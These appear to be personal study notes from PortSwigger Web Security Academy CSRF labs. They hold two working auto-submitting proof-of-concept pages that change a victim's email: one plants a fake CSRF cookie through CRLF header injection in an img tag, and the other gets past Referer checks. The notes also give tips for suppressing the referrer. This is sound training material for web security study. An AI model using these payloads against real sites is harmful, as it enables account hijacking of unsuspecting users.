CSRF

When there is a simple control made by CSRF and Cookie session CSRF, try to inject a fake token with another request

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0af600c004d5f0c5c0a71aaf001c002e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;dontwannacry&#46;com" />
      <input type="hidden" name="csrf" value="fake" />
      <input type="submit" value="Submit request" />
    </form>
  <img src=https://0af600c004d5f0c5c0a71aaf001c002e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake onerror="document.forms[0].submit();"/>
  </body>
</html>


This was possible because the search request allow to set cookie and with that request we change the value of fake.
With <img src=> you can do almost anything even setting a cookie if in the request is allow.%2f%6e%2f%72

PoC
HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrf=fake; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 3334


In case there is a control in the refferer, try to control if it is no inserted what happen.
In a positive case insert this to avoid the refferer

<meta name="referrer" content="no-referrer">



If you still have to face the referrer, try to push in hte history the original url, if you have still problem, add in the head of the exploit server this:

Referrer-Policy: unsafe-url

Body example

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?0a90000e0350a410c02c557100b40056.web-security-academy.net/')</script>
    <form action="https://0a90000e0350a410c02c557100b40056.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;dontwannacry&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>


